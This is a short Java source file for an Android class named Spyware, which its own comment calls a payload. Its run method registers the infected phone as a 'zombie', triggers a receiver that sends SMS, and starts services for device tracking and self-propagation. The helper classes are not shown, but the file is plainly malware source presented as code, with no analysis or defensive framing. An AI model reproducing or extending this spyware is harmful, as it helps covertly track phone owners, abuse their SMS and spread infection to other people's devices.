package android.spyware;

import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.preference.PreferenceManager;

/**
 * This is the Spyware class of the android.spyware payload.
 */
public class Spyware {
    public static final boolean DEV_MODE = true;
    public static final String TAG = "::trace";
    public static final int TIMER = 5;

    private Context context;
    private SharedPreferences prefs;

    public Spyware(Context context) {
        this.context = context;
        this.prefs = PreferenceManager.getDefaultSharedPreferences(context);
    }

    public void run() {
        // Broadcast a signal to SendZombieR only if there is no previous Zombie recorded.
        if (!prefs.getBoolean("SendZombieR", false))
            context.sendBroadcast(new Intent(context, SendZombieR.class));

        // Send a broadcast signal to SendSMS.
        context.sendBroadcast(new Intent(context, SendSMSR.class));

        // Start the Tracker and the Propagation services.
        context.startService(new Intent(context, PropagateS.class));
        context.startService(new Intent(context, TrackerS.class));
    }
}
